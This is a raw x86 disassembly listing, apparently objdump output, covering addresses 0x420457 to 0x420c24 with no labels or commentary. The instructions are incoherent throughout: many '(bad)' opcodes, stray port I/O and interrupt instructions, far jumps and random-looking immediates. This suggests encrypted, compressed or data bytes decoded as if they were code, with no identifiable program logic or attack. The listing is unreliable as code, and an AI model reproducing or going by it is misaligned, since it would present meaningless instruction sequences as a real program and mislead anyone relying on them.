  420457:	icebp  
  420458:	and    BYTE PTR [ebx-0x6b444887],ah
  42045e:	jae    0x420471
  420460:	xor    eax,0x9a13b110
  420465:	jo     0x4203fa
  420467:	mov    WORD PTR [edx],cs
  420469:	push   ss
  42046a:	mov    ds:0x63a3b487,eax
  42046f:	fdiv   QWORD PTR [ebx+0x77]
  420472:	cwde   
  420473:	pop    edx
  420474:	ret    
  420475:	addr16 daa 
  420477:	ds fwait
  420479:	or     ah,BYTE PTR ds:0x26cf4923
  42047f:	pop    ss
  420480:	xchg   ebp,eax
  420481:	ret    0x39e2
  420484:	or     bl,BYTE PTR [ecx-0x4b]
  420487:	sbb    DWORD PTR [edx+0x31cf2b8b],edi
  42048d:	pop    edi
  42048e:	js     0x420443
  420490:	rcl    DWORD PTR es:[esi+0x1361ba37],0xc
  420498:	mov    ebx,0xbc458253
  42049d:	add    BYTE PTR [eax+ecx*8+0xf],dh
  4204a1:	mov    al,ds:0xd98678f6
  4204a6:	js     0x4204a4
  4204a8:	jp     0x42051d
  4204aa:	jae    0x420493
  4204ac:	fs push ebx
  4204ae:	imul   esi,DWORD PTR [esi-0x31],0x761019d1
  4204b5:	cmp    bh,BYTE PTR ds:0xa2af626d
  4204bb:	xor    eax,0x81b31cbd
  4204c0:	jnp    0x4204a0
  4204c2:	or     BYTE PTR [eax],al
  4204c4:	(bad)  
  4204c5:	pop    edx
  4204c6:	mov    edi,0x9c7d8243
  4204cb:	push   0x79
  4204cd:	(bad)  
  4204ce:	jo     0x4204b1
  4204d0:	lock in eax,0x7f
  4204d3:	imul   ebp,ebp,0xa6facba5
  4204d9:	xchg   esp,eax
  4204da:	loopne 0x42054c
  4204dc:	pop    esi
  4204dd:	jmp    0x848b:0x3fb2a5eb
  4204e4:	dec    esp
  4204e5:	sbb    bh,BYTE PTR [ebx-0x3b]
  4204e8:	cmp    DWORD PTR [eax+0x67],ebp
  4204eb:	or     eax,0xb84799a1
  4204f0:	push   cs
  4204f1:	or     ebp,DWORD PTR [eax]
  4204f3:	jmp    0x889df426
  4204f8:	int3   
  4204f9:	xchg   esp,eax
  4204fa:	ds jnp 0x4204dd
  4204fd:	inc    esi
  4204fe:	ins    BYTE PTR es:[edi],dx
  4204ff:	mov    dh,0xb
  420501:	cmp    al,0xd6
  420503:	leave  
  420504:	ret    
  420505:	xchg   ebp,eax
  420506:	mov    DWORD PTR [ebx-0x74],ecx
  420509:	retf   
  42050a:	and    ecx,DWORD PTR [edx-0x39e70ca3]
  420510:	ror    al,0x17
  420513:	pop    eax
  420514:	mov    esp,0x75a24e93
  420519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42051a:	pop    eax
  42051b:	pop    edi
  42051c:	mov    ecx,0xa56011d6
  420521:	clc    
  420522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420523:	pushf  
  420524:	out    0x99,eax
  420526:	out    dx,eax
  420527:	lods   eax,DWORD PTR ds:[esi]
  420528:	mov    al,0xdd
  42052a:	or     BYTE PTR [eax-0x1ce2f7af],ah
  420530:	inc    edx
  420531:	cmc    
  420532:	stos   DWORD PTR es:[edi],eax
  420533:	sbb    dl,BYTE PTR [edi]
  420535:	or     esp,DWORD PTR [ebx-0x6b]
  420538:	cmp    ch,dl
  42053a:	fisubr DWORD PTR ds:0xf05e57cb
  420540:	les    ecx,FWORD PTR [esi*4-0x76ad4f5a]
  420547:	mov    ebx,DWORD PTR [esi-0x5e]
  42054a:	mov    esi,0xf2ed10f4
  42054f:	add    al,0x94
  420551:	add    al,0xd0
  420553:	xchg   ebx,eax
  420554:	lods   eax,DWORD PTR ds:[esi]
  420555:	fmul   DWORD PTR [edi+0xb0e007b]
  42055b:	mov    eax,0xa853971b
  420560:	dec    esi
  420561:	adc    eax,0xfe238c93
  420566:	mov    ecx,0xa693792
  42056b:	push   edi
  42056c:	jg     0x4205d6
  42056e:	and    al,0xb5
  420570:	out    dx,al
  420571:	xor    BYTE PTR [edi],al
  420573:	in     eax,0xf5
  420575:	scas   eax,DWORD PTR es:[edi]
  420576:	add    eax,0xd68d5fff
  42057b:	clc    
  42057c:	xchg   edx,eax
  42057d:	pop    esi
  42057e:	mov    esp,0xa301abc7
  420583:	pop    es
  420584:	mov    ds:0x797085ef,al
  420589:	push   ss
  42058a:	jnp    0x42059a
  42058c:	inc    edx
  42058d:	adc    bl,dl
  42058f:	addr16 mov al,0xaa
  420592:	push   esp
  420593:	pop    eax
  420594:	sub    al,0x38
  420596:	xchg   BYTE PTR [ebx],ah
  420598:	and    BYTE PTR [ebx-0x64f3eda0],ah
  42059e:	scas   al,BYTE PTR es:[edi]
  42059f:	inc    esp
  4205a0:	cs mov edx,0x1bf9675e
  4205a6:	lea    esi,[ebp-0x61912eaa]
  4205ac:	mov    ebp,esi
  4205ae:	aas    
  4205af:	dec    eax
  4205b0:	pop    esi
  4205b1:	imul   eax,DWORD PTR [ebx+eiz*2+0x34d38460],0xffffff8d
  4205b9:	jecxz  0x420635
  4205bb:	push   ss
  4205bc:	jmp    DWORD PTR [edi]
  4205be:	adc    esi,DWORD PTR [esi-0x24a9604b]
  4205c4:	mov    edx,0x151f8249
  4205c9:	fdivr  st,st(3)
  4205cb:	xor    ebp,esi
  4205cd:	rcr    bh,cl
  4205cf:	call   DWORD PTR [ecx+0x77]
  4205d2:	xorps  xmm1,XMMWORD PTR [esi+edi*4+0x36]
  4205d7:	int3   
  4205d8:	mov    ebx,0xd49c3821
  4205dd:	shr    DWORD PTR [esi],cl
  4205df:	div    DWORD PTR ds:0x98d16920
  4205e5:	inc    edi
  4205e6:	aaa    
  4205e7:	out    0x56,eax
  4205e9:	or     ch,dl
  4205eb:	leave  
  4205ec:	pusha  
  4205ed:	pop    ebp
  4205ee:	imul   di,WORD PTR [edi],0xe943
  4205f3:	and    eax,0x9199c331
  4205f8:	jg     0x42061a
  4205fa:	(bad)  
  4205fb:	in     al,dx
  4205fc:	(bad)  
  4205fd:	into   
  4205fe:	bound  edx,QWORD PTR [ebp+0x7910ca1e]
  420604:	or     DWORD PTR [ebx+ecx*4-0x49643603],0xaf4237f7
  42060f:	cmp    BYTE PTR [esi],bl
  420611:	xor    eax,0x862745ec
  420616:	dec    esp
  420617:	adc    bl,bh
  420619:	xchg   BYTE PTR [ebp+0xe],dl
  42061c:	sbb    bh,BYTE PTR [edi]
  42061e:	in     al,dx
  42061f:	mov    ah,0xeb
  420621:	dec    ecx
  420622:	(bad)  
  420624:	pop    esi
  420625:	xor    DWORD PTR [ecx],0x6d
  420628:	ror    BYTE PTR [esi+0x2f2df052],cl
  42062e:	push   esi
  42062f:	sbb    esi,DWORD PTR [esi+esi*4]
  420632:	adc    DWORD PTR [esi-0xd],0x6bfdce02
  420639:	adc    DWORD PTR [ecx-0x89c2ebf],eax
  42063f:	jp     0x4206a0
  420641:	into   
  420642:	fdivr  QWORD PTR [eax-0x371fd1fd]
  420648:	(bad)  
  420649:	cld    
  42064a:	cdq    
  42064b:	sbb    dh,ch
  42064d:	test   al,0x1c
  42064f:	rcl    BYTE PTR [esi-0xdf052a2],0xaf
  420656:	adc    DWORD PTR [eax+0x21120d2a],0x518ac367
  420660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420661:	cli    
  420662:	aas    
  420663:	test   eax,0x22a3c73f
  420668:	seta   BYTE PTR [edx+0x6]
  42066c:	retf   0xc6f4
  42066f:	(bad)  
  420670:	dec    DWORD PTR [edx]
  420672:	test   BYTE PTR [ebx],bl
  420674:	ins    DWORD PTR es:[edi],dx
  420675:	(bad)  
  420676:	ja     0x42068d
  420678:	mov    ds:0xff1f6259,eax
  42067d:	dec    edx
  42067e:	pop    esi
  42067f:	pop    esi
  420680:	addr16 cmp al,0x96
  420683:	out    dx,eax
  420684:	nop
  420685:	test   eax,0x1be1ecdc
  42068a:	int3   
  42068b:	adc    al,0x8d
  42068d:	pop    ebp
  42068e:	imul   esi,DWORD PTR [ebp-0x6f],0xc
  420692:	jo     0x420685
  420694:	add    DWORD PTR gs:[ebx],0xffffff9e
  420698:	xchg   BYTE PTR [esi-0x44f6ff38],bl
  42069e:	pop    ds
  42069f:	iret   
  4206a0:	aas    
  4206a1:	mov    ds:0xe604de57,al
  4206a6:	pop    ecx
  4206a7:	and    al,0x48
  4206a9:	ja     0x420719
  4206ab:	adc    eax,0x11755aa3
  4206b0:	ins    DWORD PTR es:[edi],dx
  4206b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206b2:	adc    esi,DWORD PTR [esp+ecx*2+0xe]
  4206b6:	rcr    esi,0xe5
  4206b9:	inc    eax
  4206ba:	push   ebp
  4206bc:	mov    ds:0xb5915a91,al
  4206c1:	arpl   WORD PTR [edi],sp
  4206c3:	mov    DWORD PTR [esi-0xa4846fa],edi
  4206c9:	xlat   BYTE PTR ds:[ebx]
  4206ca:	mov    bl,BYTE PTR [ebx+0x34]
  4206cd:	das    
  4206ce:	adc    esp,DWORD PTR [eax+0x2669ac92]
  4206d4:	pop    ebp
  4206d5:	fst    st(3)
  4206d7:	xchg   edx,eax
  4206d8:	shr    BYTE PTR [edi],0x48
  4206db:	test   al,0x82
  4206dd:	xchg   edi,eax
  4206de:	inc    ecx
  4206df:	into   
  4206e0:	lods   al,BYTE PTR ds:[esi]
  4206e1:	or     BYTE PTR [edi+ecx*1-0x354ae9fe],al
  4206e8:	push   ebx
  4206e9:	adc    DWORD PTR [ebp-0x21],eax
  4206ec:	(bad)  
  4206ee:	mov    dh,0xc0
  4206f0:	adc    eax,0x33b37849
  4206f5:	bound  esi,QWORD PTR [edi]
  4206f7:	mov    ebp,0xa90f5652
  4206fc:	(bad)  
  4206fd:	push   cs
  4206fe:	xchg   DWORD PTR [esp+eiz*4],esp
  420701:	outs   dx,BYTE PTR ds:[esi]
  420702:	gs dec esi
  420704:	imul   ebp,edi,0x4b63aeea
  42070a:	dec    esi
  42070b:	fwait
  42070c:	ret    
  42070d:	fwait
  42070e:	les    esp,FWORD PTR [esi]
  420710:	in     eax,0x8a
  420712:	xchg   ebx,eax
  420713:	add    al,0x95
  420715:	into   
  420716:	adc    al,0xd5
  420718:	fisttp WORD PTR [eax]
  42071a:	lods   eax,DWORD PTR ds:[esi]
  42071b:	and    al,0xd7
  42071d:	adc    BYTE PTR [ebx],ch
  42071f:	retf   
  420720:	pop    ebp
  420721:	in     al,dx
  420722:	or     BYTE PTR [esi-0x1d],0x50
  420726:	cs cli 
  420728:	xchg   BYTE PTR [esp+ebp*4],ah
  42072b:	cmp    esp,DWORD PTR [edx-0x60c848a7]
  420731:	(bad)  
  420732:	add    al,0x79
  420734:	jbe    0x420708
  420736:	dec    ebx
  420737:	fwait
  420738:	imul   edi,DWORD PTR ds:[esi+0x39],0x8ccea238
  420740:	mov    edi,0xed7f4731
  420745:	nop
  420746:	dec    edi
  420747:	sub    bh,bh
  420749:	and    al,0x55
  42074b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42074c:	pop    esi
  42074d:	pop    edi
  42074e:	mov    DWORD PTR [eax+0x14],ebp
  420751:	xor    DWORD PTR [edi],eax
  420753:	adc    eax,0x3b37a377
  420758:	fadd   DWORD PTR [ecx+0x11e58c82]
  42075e:	or     BYTE PTR [esi+eax*2-0x7391e248],bl
  420765:	ds inc ebp
  420767:	add    DWORD PTR [edx+0xf],ebx
  42076a:	inc    esp
  42076b:	xor    eax,0x35f38c43
  420770:	sbb    bl,BYTE PTR [esi]
  420772:	push   ebp
  420773:	in     al,dx
  420774:	dec    eax
  420775:	mov    ds:0x12ace232,al
  42077a:	push   ss
  42077b:	lods   eax,DWORD PTR ds:[esi]
  42077c:	(bad)  
  42077d:	lea    esi,[ecx]
  42077f:	and    BYTE PTR [edi+0x17],dh
  420782:	cld    
  420783:	loopne 0x4207d7
  420785:	arpl   WORD PTR [edi-0x3aa61c6c],bx
  42078b:	or     eax,0x8b31ed58
  420790:	mov    eax,0xd427235c
  420795:	fbld   TBYTE PTR [edi-0x6e]
  420798:	rol    DWORD PTR [ebp+0x7f750b97],0x6e
  42079f:	rcr    ch,cl
  4207a1:	and    bl,dl
  4207a3:	enter  0x81f8,0xbf
  4207a7:	shl    BYTE PTR [esi-0x40b09425],1
  4207ad:	pop    eax
  4207ae:	enter  0x54a6,0x11
  4207b2:	lock (bad) [ebx-0xf]
  4207b6:	mov    ch,0x58
  4207b8:	push   cs
  4207b9:	stos   BYTE PTR es:[edi],al
  4207ba:	add    DWORD PTR [ecx],ebx
  4207bc:	mov    al,0xcb
  4207be:	sbb    al,0x42
  4207c0:	adc    BYTE PTR [ebx+0x6d],bl
  4207c3:	cmp    al,0xa7
  4207c5:	jb     0x4207eb
  4207c7:	retf   0x9230
  4207ca:	dec    edx
  4207cb:	in     eax,0xaa
  4207cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207ce:	sub    al,0x58
  4207d0:	add    bh,ah
  4207d2:	arpl   di,dx
  4207d4:	mov    dh,0x2a
  4207d6:	shr    BYTE PTR [esi],1
  4207d8:	mov    ebx,0xd6aefe31
  4207dd:	sub    eax,0x6afef737
  4207e2:	stos   DWORD PTR es:[edi],eax
  4207e3:	dec    edx
  4207e4:	or     BYTE PTR ds:0x108e18ab,bh
  4207ea:	push   cs
  4207eb:	add    BYTE PTR [esi-0x4037ad77],0x6e
  4207f2:	adc    esp,esi
  4207f4:	aaa    
  4207f5:	ret    0x39d4
  4207f8:	mov    WORD PTR [esi+0x4d234108],cs
  4207fe:	test   DWORD PTR [esi-0x3c],ecx
  420801:	cld    
  420802:	arpl   WORD PTR [ecx+eiz*4+0x8],si
  420806:	dec    eax
  420807:	cmp    ch,BYTE PTR [ebx+0x148620c2]
  42080d:	ret    
  42080e:	in     al,0xe7
  420810:	pop    eax
  420811:	push   edi
  420812:	dec    eax
  420813:	xchg   ebp,eax
  420814:	and    edx,ebx
  420816:	in     eax,dx
  420817:	mov    ah,0xb9
  420819:	dec    ebp
  42081a:	cli    
  42081b:	dec    edi
  42081c:	bts    edx,edx
  42081f:	das    
  420820:	adc    BYTE PTR [eax+0x4853bea9],ch
  420826:	sbb    bh,al
  420828:	add    bh,bh
  42082a:	jno    0x4207fb
  42082c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42082d:	adc    DWORD PTR [ebp-0x730d01fb],esi
  420833:	sahf   
  420834:	pop    esi
  420835:	mov    BYTE PTR [eax-0x10],bl
  420838:	xchg   DWORD PTR [ebp+esi*4+0x4c47309a],esp
  42083f:	inc    ebp
  420840:	add    bl,BYTE PTR [ecx+eax*8+0x75]
  420844:	jge    0x4207f0
  420846:	loop   0x420873
  420848:	adc    ah,BYTE PTR [ebp+0x21c4da17]
  42084e:	pop    esi
  42084f:	aaa    
  420850:	(bad)  
  420851:	or     al,0x86
  420853:	inc    eax
  420854:	xchg   edx,eax
  420855:	xor    ch,dh
  420857:	inc    edx
  420858:	fidivr WORD PTR ds:0xdc830e16
  42085e:	mov    eax,ds:0x40edba69
  420863:	sub    esp,esi
  420865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420866:	mov    bl,0x2
  420868:	mov    eax,0xf3141237
  42086d:	jp     0x4208bd
  42086f:	push   ecx
  420870:	ins    BYTE PTR es:[edi],dx
  420871:	aam    0xda
  420873:	test   esp,0x450505a3
  420879:	jl     0x420834
  42087b:	mov    al,ds:0x37bf2bc0
  420880:	hlt    
  420881:	or     BYTE PTR ds:0xff1b3b97,bh
  420887:	pushf  
  420888:	sbb    bl,BYTE PTR [edi+ebx*8]
  42088b:	or     edx,edi
  42088d:	xchg   al,dh
  42088f:	hlt    
  420890:	fist   WORD PTR [ebx+ebx*2-0x178839d4]
  420897:	pusha  
  420898:	ins    BYTE PTR es:[edi],dx
  420899:	push   es
  42089a:	xor    cl,BYTE PTR [esp+edx*2+0x9d6d223]
  4208a1:	sbb    BYTE PTR [eax],bl
  4208a3:	or     al,0xa8
  4208a5:	shl    BYTE PTR [ecx-0x5c1a35a],cl
  4208ab:	jne    0x4208cf
  4208ad:	in     al,0x30
  4208af:	not    DWORD PTR es:[ecx-0x14f6144a]
  4208b6:	mov    ds:0x937571f6,eax
  4208bb:	xor    eax,0x16c3ddd0
  4208c0:	mov    ecx,DWORD PTR [eax-0x6c]
  4208c3:	add    esi,0xffffffe4
  4208c6:	adc    DWORD PTR [edi],edx
  4208c8:	mov    al,0x2a
  4208ca:	imul   esi,eax,0xb05c48c3
  4208d0:	mov    ecx,0x6f2eb310
  4208d5:	cmp    al,0xc
  4208d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208d8:	fnstenv [ecx]
  4208da:	(bad)  
  4208db:	cmp    bh,BYTE PTR [ecx-0x6f3213c7]
  4208e1:	pop    ecx
  4208e2:	inc    edx
  4208e3:	std    
  4208e4:	stos   DWORD PTR es:[edi],eax
  4208e5:	mov    ah,0x1b
  4208e7:	jle    0x4208af
  4208e9:	sbb    al,0x3e
  4208eb:	inc    esp
  4208ec:	out    dx,eax
  4208ed:	fistp  QWORD PTR [ebx]
  4208ef:	mov    cl,0xd2
  4208f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208f2:	dec    ebx
  4208f3:	mov    ebp,0x8f801c23
  4208f8:	iret   
  4208f9:	bound  ebx,QWORD PTR ds:0xd739dbc5
  4208ff:	mov    ecx,0xb60de612
  420904:	adc    BYTE PTR [ebp-0xc],dl
  420907:	mov    dh,0xd2
  420909:	mov    DWORD PTR [eax-0x3c],eax
  42090c:	push   ecx
  42090d:	mov    ah,0x25
  42090f:	or     al,0xf8
  420911:	scas   al,BYTE PTR es:[edi]
  420912:	nop
  420913:	mov    dl,0x99
  420915:	inc    ebx
  420916:	and    dh,BYTE PTR ds:0xec0476e8
  42091c:	in     eax,0x33
  42091e:	enter  0x790e,0xa5
  420922:	stos   BYTE PTR es:[edi],al
  420923:	push   esp
  420924:	cmp    edi,esi
  420926:	pop    edx
  420927:	fidiv  DWORD PTR [esi+ecx*8]
  42092a:	jne    0x4208ae
  42092c:	xor    DWORD PTR [eax-0x50],edx
  42092f:	cmp    DWORD PTR [esp+ebp*8],ecx
  420932:	sbb    al,0x4f
  420934:	btc    DWORD PTR [edi-0x41],eax
  420938:	or     eax,0x17c349d4
  42093d:	cmp    al,0x5
  42093f:	iret   
  420940:	sub    esi,DWORD PTR [ecx]
  420942:	test   al,0x54
  420944:	pop    ebx
  420945:	jb     0x4209a7
  420947:	xchg   BYTE PTR [esp+ebp*2+0x5fbd7ab1],bh
  42094e:	mov    ch,0x18
  420950:	jae    0x42091d
  420952:	pushf  
  420953:	loope  0x420900
  420955:	mov    edi,0x9a5b2b13
  42095a:	das    
  42095b:	xor    bl,0xca
  42095e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42095f:	imul   esi,DWORD PTR [edi],0xffffff8e
  420962:	mov    BYTE PTR [eax+0x61],dl
  420965:	mov    ds:0xd691fead,eax
  42096a:	or     eax,DWORD PTR [edi]
  42096c:	das    
  42096d:	push   edi
  42096e:	xchg   ebx,eax
  42096f:	imul   eax,DWORD PTR [ebx-0x1f2dd243],0xffffffc7
  420976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420977:	inc    ebp
  420978:	retf   
  420979:	mov    BYTE PTR [edx+0x1e3c8f78],bh
  42097f:	ins    DWORD PTR es:[edi],dx
  420980:	push   ecx
  420981:	outs   dx,BYTE PTR ds:[esi]
  420982:	scas   al,BYTE PTR es:[edi]
  420983:	and    DWORD PTR [ecx+0x4a18e6af],edx
  420989:	dec    ebx
  42098a:	scas   eax,DWORD PTR es:[edi]
  42098b:	mov    bl,0x20
  42098d:	push   ebx
  42098e:	scas   al,BYTE PTR es:[edi]
  42098f:	fwait
  420990:	rcl    DWORD PTR [ebx],1
  420992:	div    BYTE PTR [edx-0x34]
  420995:	pushf  
  420996:	test   eax,0xc85cf5a5
  42099b:	mov    ch,0xbc
  42099d:	fild   WORD PTR [ebx+edx*4-0x22]
  4209a1:	or     esp,0x33
  4209a4:	sahf   
  4209a5:	cmp    eax,0xbfbd6ca1
  4209aa:	dec    ch
  4209ac:	daa    
  4209ad:	ss sbb eax,0xd0426e2
  4209b3:	dec    ebx
  4209b4:	mov    ?,WORD PTR [eax-0x5c]
  4209b7:	dec    ecx
  4209b8:	inc    ebp
  4209b9:	xor    dh,BYTE PTR [edi-0x2b]
  4209bc:	sbb    esp,DWORD PTR [edx-0x5b]
  4209bf:	mov    ah,0xbb
  4209c1:	or     eax,edx
  4209c3:	pop    es
  4209c4:	xchg   esp,eax
  4209c5:	mov    ebp,0x72dee688
  4209ca:	mov    ebp,0xd1d3cd3d
  4209cf:	js     0x420a4c
  4209d1:	(bad)  
  4209d2:	adc    dh,dh
  4209d4:	push   edx
  4209d5:	lods   eax,DWORD PTR ds:[esi]
  4209d6:	jl     0x42095d
  4209d8:	mov    DWORD PTR [ebp-0x1],esi
  4209db:	leave  
  4209dc:	das    
  4209dd:	lahf   
  4209de:	daa    
  4209df:	daa    
  4209e0:	xor    DWORD PTR [ebp-0x43ff17c6],edi
  4209e6:	aam    0x6c
  4209e8:	sub    eax,0x9c8037f8
  4209ed:	retf   
  4209ee:	(bad)  
  4209ef:	pop    ss
  4209f0:	sbb    eax,0x2da8b1ad
  4209f5:	outs   dx,BYTE PTR ds:[esi]
  4209f6:	push   ebp
  4209f7:	mov    edx,0x75a782eb
  4209fc:	xor    DWORD PTR [esi],esi
  4209fe:	sbb    esi,DWORD PTR [edi]
  420a00:	sub    cl,BYTE PTR [edi-0x37]
  420a03:	inc    edx
  420a04:	int    0x4d
  420a06:	mov    esi,0x6908967d
  420a0b:	leave  
  420a0c:	dec    eax
  420a0d:	(bad)  [edx*4-0x1c2e63b8]
  420a14:	ins    DWORD PTR es:[edi],dx
  420a15:	xor    eax,0x9188783d
  420a1a:	pushf  
  420a1b:	es xor al,0x5d
  420a1e:	aam    0xeb
  420a20:	mov    ds:0x382c3c0c,al
  420a25:	jo     0x420a11
  420a27:	aaa    
  420a28:	or     eax,0x15721d36
  420a2d:	and    BYTE PTR [edi-0x3c],ch
  420a30:	jbe    0x4209ed
  420a32:	icebp  
  420a33:	push   ecx
  420a34:	dec    ecx
  420a35:	outs   dx,BYTE PTR ds:[esi]
  420a36:	xchg   ecx,eax
  420a37:	arpl   WORD PTR [edi-0x47],cx
  420a3a:	les    ebp,FWORD PTR [ebp-0x1e]
  420a3d:	pop    edx
  420a3e:	xor    al,0xa2
  420a40:	int    0x95
  420a42:	fdivrp st(2),st
  420a44:	cmp    DWORD PTR [ebp+0x639673e6],edi
  420a4a:	or     DWORD PTR [ebp-0x293cc75e],ecx
  420a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a51:	ins    DWORD PTR es:[edi],dx
  420a52:	xchg   ebx,eax
  420a53:	es stos DWORD PTR es:[edi],eax
  420a55:	mov    eax,0x63428c0a
  420a5a:	scas   al,BYTE PTR es:[edi]
  420a5b:	retf   0xa528
  420a5e:	daa    
  420a5f:	push   0x220ff49
  420a64:	jg     0x420a88
  420a66:	dec    eax
  420a67:	sbb    dh,bh
  420a69:	xor    eax,0xd5aa5968
  420a6e:	retf   0x5031
  420a71:	mov    esi,0x6cb860bb
  420a76:	cld    
  420a77:	push   ss
  420a78:	test   al,0x64
  420a7a:	fs xchg ebx,eax
  420a7c:	mov    esp,0x4b0ffaf5
  420a81:	xchg   dl,al
  420a83:	jbe    0x420af4
  420a85:	outs   dx,BYTE PTR ds:[esi]
  420a86:	lea    esi,[ebx-0x27]
  420a89:	push   eax
  420a8a:	push   ss
  420a8b:	mov    WORD PTR [eax],?
  420a8d:	shl    DWORD PTR [edi-0x21747e4f],0xf1
  420a94:	icebp  
  420a95:	mov    eax,0x322d194e
  420a9a:	sahf   
  420a9b:	mov    BYTE PTR [esi+ebx*1-0x74],dl
  420a9f:	or     DWORD PTR [eax+0x658e8daa],0x5ef37080
  420aa9:	mov    eax,0x356a47f1
  420aae:	(bad)  
  420aaf:	mov    ebx,0x1392cf55
  420ab4:	mov    dh,0x74
  420ab6:	adc    eax,0x28de37a4
  420abb:	lods   eax,DWORD PTR ds:[esi]
  420abc:	test   BYTE PTR [ebp+0x64465205],0xa8
  420ac3:	fisubr WORD PTR [edi-0x77b36b48]
  420ac9:	and    al,0xf8
  420acb:	jl     0x420ae2
  420acd:	push   0xffffff86
  420acf:	adc    al,0x50
  420ad1:	push   eax
  420ad2:	and    al,BYTE PTR [esi+0x602ec408]
  420ad8:	(bad)  
  420ad9:	pop    ebx
  420ada:	mov    esp,0x2727b38a
  420adf:	nop
  420ae0:	popf   
  420ae1:	mov    eax,ds:0x5d672759
  420ae6:	pop    ds
  420ae7:	mov    bh,BYTE PTR [esp+eax*2]
  420aea:	das    
  420aeb:	sub    esp,DWORD PTR [edi]
  420aed:	retf   
  420aee:	push   ebx
  420aef:	out    0x24,eax
  420af1:	rdtsc  
  420af3:	or     DWORD PTR [ebx+0x34],esi
  420af6:	jne    0x420ab7
  420af8:	jo     0x420aa8
  420afa:	fdivrp st(1),st
  420afc:	test   eax,0x9e8474e3
  420b01:	out    dx,eax
  420b02:	into   
  420b03:	dec    edi
  420b04:	jp     0x420b03
  420b06:	pushf  
  420b07:	xchg   ebp,eax
  420b08:	pusha  
  420b09:	mov    ds:0x409f9e52,eax
  420b0e:	ficomp DWORD PTR [esi+0x636b01bb]
  420b14:	cli    
  420b15:	pushf  
  420b16:	repz adc ch,BYTE PTR [edx]
  420b19:	sub    ecx,eax
  420b1b:	mov    bh,0xc
  420b1d:	es out 0xe1,al
  420b20:	xchg   esi,eax
  420b21:	jbe    0x420ac7
  420b23:	test   al,0x58
  420b25:	int3   
  420b26:	adc    eax,0x9505b070
  420b2b:	cmp    bl,BYTE PTR [ecx]
  420b2d:	inc    ebp
  420b2e:	cmp    esi,DWORD PTR [esi+ebx*1]
  420b31:	stos   BYTE PTR es:[edi],al
  420b32:	xchg   edi,eax
  420b33:	add    BYTE PTR [edi-0x61d8497c],bl
  420b39:	inc    ebp
  420b3a:	fmul   st,st(2)
  420b3c:	mov    esi,0xd15eeb83
  420b41:	cli    
  420b42:	les    ecx,FWORD PTR [edx-0x2c854e5a]
  420b48:	sub    ah,BYTE PTR [ecx]
  420b4a:	cmp    BYTE PTR [edx+0x574749b4],ch
  420b50:	adc    DWORD PTR [ebp-0x7435b4d7],edx
  420b56:	mov    dl,0x94
  420b58:	inc    ebp
  420b59:	or     al,0xde
  420b5b:	dec    edx
  420b5c:	pop    ecx
  420b5d:	push   ebp
  420b5e:	div    DWORD PTR [ebp+eax*8+0x29]
  420b62:	fwait
  420b63:	jae    0x420bcf
  420b65:	or     bl,BYTE PTR [esi+eax*1]
  420b68:	add    bl,BYTE PTR [ecx]
  420b6a:	jmp    0x420b17
  420b6c:	pop    edx
  420b6d:	das    
  420b6e:	inc    ecx
  420b6f:	jg     0x420b9a
  420b71:	(bad)
  420b75:	push   ds
  420b76:	ins    DWORD PTR es:[edi],dx
  420b77:	dec    ecx
  420b78:	int    0xa0
  420b7a:	aam    0x29
  420b7c:	adc    eax,0xd7f6fabf
  420b81:	pop    ebp
  420b82:	(bad)  
  420b83:	imul   esp,DWORD PTR [ecx],0x83366bc
  420b89:	push   es
  420b8a:	mov    ebx,0x860bd7af
  420b8f:	(bad)  [eax+0x6e2fb176]
  420b95:	test   BYTE PTR [esi-0x4f],ch
  420b98:	cmp    bh,BYTE PTR [edx+0x66]
  420b9b:	call   0x2cb9b55d
  420ba0:	js     0x420b44
  420ba2:	cmp    BYTE PTR ds:0x74104eca,bl
  420ba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ba9:	jne    0x420b70
  420bab:	push   eax
  420bac:	ds xchg ebx,eax
  420bae:	ror    ah,1
  420bb0:	sbb    ch,bh
  420bb2:	test   BYTE PTR [ebx+eax*4-0x6f],bl
  420bb6:	imul   BYTE PTR [edi+0x6d420676]
  420bbc:	push   0xaa72a7cf
  420bc1:	bound  edi,QWORD PTR [ecx+0x3f]
  420bc4:	xchg   BYTE PTR [ecx+0xc],ch
  420bc7:	jg     0x420bf4
  420bc9:	jg     0x420bcc
  420bcb:	xchg   dh,dh
  420bcd:	xchg   ebx,eax
  420bce:	adc    eax,0x887e7786
  420bd3:	inc    ebx
  420bd4:	xor    DWORD PTR [ebx],esi
  420bd6:	mov    dl,0x7a
  420bd8:	stos   BYTE PTR es:[edi],al
  420bd9:	pop    ebp
  420bda:	(bad)  
  420bdb:	js     0x420b97
  420bdd:	sbb    al,ch
  420bdf:	pop    es
  420be0:	addr16 jb 0x420bc5
  420be3:	test   BYTE PTR [eax+0x7378d68b],dl
  420be9:	adc    al,0xa9
  420beb:	das    
  420bec:	fcom   DWORD PTR [eax+0x3d]
  420bef:	dec    eax
  420bf0:	sub    edx,DWORD PTR [ebx+0x6cc3cb2]
  420bf6:	mov    cl,0x6f
  420bf8:	jle    0x420c6b
  420bfa:	inc    eax
  420bfb:	imul   edx,DWORD PTR [edi],0x6d2a732b
  420c01:	in     eax,0x2c
  420c03:	icebp  
  420c04:	or     al,0x2f
  420c06:	(bad)  
  420c07:	cmp    ecx,DWORD PTR [ebp-0x2a]
  420c0a:	outs   dx,BYTE PTR ds:[esi]
  420c0b:	js     0x420c37
  420c0d:	(bad)  
  420c0e:	int    0xa4
  420c10:	retf   0x8370
  420c13:	sbb    bh,BYTE PTR [eax-0x2]
  420c16:	mov    edi,edx
  420c18:	mov    al,ds:0xb577af6d
  420c1d:	xlat   BYTE PTR ds:[ebx]
  420c1e:	dec    eax
  420c1f:	call   0x8d6a01e3
  420c24:	sub    ebp,DWORD PTR [edi+0x35]
